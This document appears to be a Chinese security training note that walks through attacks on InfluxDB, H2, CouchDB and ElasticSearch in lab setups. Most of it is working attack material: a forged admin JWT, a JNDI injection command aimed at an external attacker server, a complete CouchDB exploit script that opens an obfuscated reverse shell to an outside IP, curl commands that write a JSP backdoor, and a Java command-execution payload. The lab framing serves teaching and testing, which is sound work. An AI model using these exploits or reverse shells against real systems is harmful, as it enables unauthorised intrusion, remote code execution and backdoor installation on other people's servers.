![1649469977031-7c631eff-7130-4304-8bf4-16d33cec1edc.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134121528-1597382730.png)

```plain
#知识点：
1、服务攻防-数据库类型安全
2、influxdb-未授权访问-jwt验证
3、H2database-未授权访问-配置不当
4、CouchDB-权限绕过配合RCE-漏洞
5、ElasticSearch-文件写入&RCE-漏洞
这些数据库在特定的环境上用到，特用的程序固定的。使用面不广，但是有一定的应用价值。会根据应用功能选择数据库。

#章节内容：
常见服务应用的安全测试：
1、配置不当-未授权访问
2、安全机制-特定安全漏洞
3、安全机制-弱口令爆破攻击

#前置知识：
应用服务安全测试流程：见图
1、判断服务开放情况-端口扫描&组合应用等
2、判断服务类型归属-数据库&文件传输&通讯等
3、判断服务利用方式-特定漏洞&未授权&弱口令等
```

- Influxdb-未授权访问-Jwt验证不当

```plain
InfluxDB 是一个时间序列数据库(TSDB), 被设计用来处理高写入、高查询负载,是 TICK 的一部分。与mysql应用价值是不一样的。
默认端口：8086 8088
influxdb是一款著名的时序数据库，其使用jwt作为鉴权方式。在用户开启了认证，但未设置参数shared-secret的情况下，jwt的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。空加密秘钥串。

启动环境：
cd vulhub-master/influxdb/unacc/
docker-compose up -d

端口扫描：
nmap 192.168.233.128
```

![1649471251015-8d8ac943-1654-4246-a783-87132de7b188.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134219138-1373727678.png)

```plain
先判断8086端口是不是开放的。然后在网上搜索漏洞Influxdb：https://blog.csdn.net/weixin_43416469/article/details/113843301

访问：192.168.233.128:8086/debug/vars
需要访问特定地址或者执行SQL语句，看看有没有漏洞

请求地址：192.168.233.128:8086/query
POST提交去执行SQL语句：db=sample&q=show+users
这个提交就需要登录才可以进行数据库执行。
```

![1649471687521-3851a692-c035-49e4-87d1-fd8d518d5cdc.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134219792-1910194873.png)

```plain
这个时候，就利用到jwt来进行未授权绕过。

1、借助https://jwt.io/来生成jwt token：
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "username": "admin",
  "exp": 1676346267
}

注意在秘钥哪里需要留空。
生成：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A
```

![1649472312124-bdd94c48-65df-4e4a-8cbe-ac9382fa2b9e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134219784-1364899390.png)

```plain
抓包，然后修改数据包：
POST /query HTTP/1.1
Host: 192.168.233.128:8086
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

db=sample&q=show+users
```

![1649472505140-62645e51-6635-4686-992a-c2372f7c86cc.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134219390-1135537588.png)

- H2database-未授权访问-配置不当

```plain
与redis配置是一样的
web端口：8080
默认端口：20051
H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权，配置如下：
spring.h2.console.enabled=true 
spring.h2.console.settings.web-allow-others=true 

利用到的工具是java内置的攻击：JNDI攻击。这个是由于java内置的语言不同特性决定的。java网站运行有两种情况：1.自写源代码来进行运行 2.运行jar包

利用流程是：
1.下载利用文件
2.利用这个文件去生成一个payload
3.让这个地址去加载远程文件。

启动环境：
cd /vulhub-master/h2database/h2-console-unacc
docker-compose up -d
```

![1649478023168-cd11b308-87bc-45e1-b64a-fe31ceb9622d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134219330-1591942765.png)

```plain
利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。
1、下载JNDI-Injection-Exploit
https://github.com/welk1n/JNDI-Injection-Exploit

2、生成执行RMI Payload-URL
-C 执行命令 -A 服务器地址
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/success -A 175.178.151.29 （运行JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar包）175.178.151.297为攻击地址
```

![1649478300716-b85d6ecf-f6f9-4dc7-8276-1ea0af46e911.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134219531-1873225156.png)

```plain
会生成几个地址，一般选取：rmi://175.178.151.29:1099/ksvyoy

然后打开特定地址：http://192.168.233.128:8080/h2-console/login.jsp?jsessionid=8cdecf52152246fdd719b88eb2a891d7

把rmi://175.178.151.29:1099/ksvyoy写到JDBC URL
把javax.naming.InitialContext写到Driver Class
```

![1649478952299-25a3b8bc-5f71-4ec6-9b52-745b0e762bce.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134219449-1067327603.png)

```plain
但是这里失败了，需要在外网服务器上执行这个jar包，才可以成功。
```

![1649479383841-de52947a-1382-4143-9341-7af1c91c58c0.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134219557-215043913.png)

```plain
在tmp目录下就多出了一个文件目录，因为这个命令是创建一个目录的命令
```

![1649479486122-9e136392-1b32-4e73-84a4-ad5e13a63d08.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134219692-1963340369.png)

- CouchDB-权限绕过配合RCE-漏洞

```plain
默认端口：5984
Apache CouchDB是一个开源数据库，专注于易用性和成为"完全拥抱web的数据库"。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）专门用来存储文档的数据库


fofa："CouchDB"&&port="5984"
```

未授权

```plain
启动环境：（未授权）
/vulhub-master/couchdb/CVE-2017-12635
docker-compose up -d

访问地址：http://192.168.233.128:5984/
```

![1649480145108-6d3c03e8-fc77-4d86-b03c-9d1081974f7c.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134219752-2055938969.png)

```plain
访问特定地址：http://192.168.233.128:5984/_users/org.couchdb.user:vulhub
POST提交：
{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "roles": [],
  "password": "vulhub"
}

返回添加失败
```

![1649480299429-f9f777e4-7b04-4979-ad6a-792e40cf9eb5.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134220129-1268556534.png)

```plain
然后在修改提交方式PUT，完成添加密码。
```

![1649480407916-17727670-f903-442f-a3db-08de632e3836.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134220296-1398813509.png)

```plain
访问：http://192.168.233.128:5984/_utils/

输入账号密码：vulhub，vulhub 登录成功。
```

RCE执行

```plain
启动环境：
/vulhub-master/couchdb/CVE-2017-12636
docker-compose up -d

1、下载exp.py
2、修改目标和反弹地址
3、Python3调用执行即可

exp.py下载：https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py
exp.py代码：

#!/usr/bin/env python3
import requests
import json
import base64
from requests.auth import HTTPBasicAuth

target = 'http://192.168.233.128:5984'
command = rb"""sh -i >& /dev/tcp/175.178.151.29/5566 0>&1"""
version = 1

session = requests.session()
session.headers = {
    'Content-Type': 'application/json'
}
# session.proxies = {
#     'http': 'http://127.0.0.1:8085'
# }
session.put(target + '/_users/org.couchdb.user:wooyun', data='''{
  "type": "user",
  "name": "wooyun",
  "roles": ["_admin"],
  "roles": [],
  "password": "wooyun"
}''')

session.auth = HTTPBasicAuth('wooyun', 'wooyun')

command = "bash -c '{echo,%s}|{base64,-d}|{bash,-i}'" % base64.b64encode(command).decode()
if version == 1:
    session.put(target + ('/_config/query_servers/cmd'), data=json.dumps(command))
else:
    host = session.get(target + '/_membership').json()['all_nodes'][0]
    session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=json.dumps(command))

session.put(target + '/wooyun')
session.put(target + '/wooyun/test', data='{"_id": "wooyuntest"}')

if version == 1:
    session.post(target + '/wooyun/_temp_view?limit=10', data='{"language":"cmd","map":""}')
else:
    session.put(target + '/wooyun/_design/test', data='{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}')
执行：G:\python38\python.exe exp.py
监听：nc-lvvp 5566
```

![1649481101942-469c3da5-d6c0-4bb7-876b-4b7355619fcc.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134220191-28322801.png)

- ElasticSearch-文件写入&RCE-漏洞

```plain
默认端口：9200 9300

一般在蓝队中，经常与kibana一起搭建，用于日志分析等。
```

文件写入

```plain
启动环境：http://vulfocus.io/#/dashboard

-Elasticsearch 文件写入 wooyun_2015_110216
9200一般为ElasticSearch的常用端口，此漏洞环境需要与中间件使用
1、发现9200端口存在elasticsearch页面，8080存在tomcat目录，需要配合网站中间件
2、利用ElasticSearch写入后门到/usr/local/tomcat/webapps/wwwroot/(tomocat安装目录)

直接执行命令：
curl -XPOST http://123.58.236.76:31619/yz.jsp/yz.jsp/1 -d'
{"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>":"test"}
'

curl -XPUT 'http://123.58.236.76:31619/_snapshot/yz.jsp' -d '{
     "type": "fs",
     "settings": {
          "location": "/usr/local/tomcat/webapps/wwwroot/",
          "compress": false
     }
}'


curl -XPUT "htt31620p://123.58.236.76:31619/_snapshot/yz.jsp/yz.jsp" -d '{
     "indices": "yz.jsp",
     "ignore_unavailable": "true",
     "include_global_state": false
}'
```

![1649482880973-309848c0-d2f7-4a5d-bd62-9de7963c269b.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134220667-751795007.png)

```plain
3、访问8080端口snapshot-yz.jsp文件写入代码到test.jsp中
http://123.58.236.76:31620/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success
success是需要写入的后门
http://123.58.236.76:31620/wwwroot/test.jsp
```

RCE执行

```plain
-Elasticsearch RCE CVE-2014-3120
1、漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据


抓包，替换一下数据包：
POST /website/blog/ HTTP/1.1
Host: 123.58.236.76:58532
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "xiaodi"
}
```

![1649483650643-430faf95-dd5d-4370-ab75-1bf68cb459e5.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134220762-377931956.png)

```plain
2、直接发包触发执行命令

POST /_search?pretty HTTP/1.1
Host: 123.58.236.76:58532
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 343

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}

返回root
```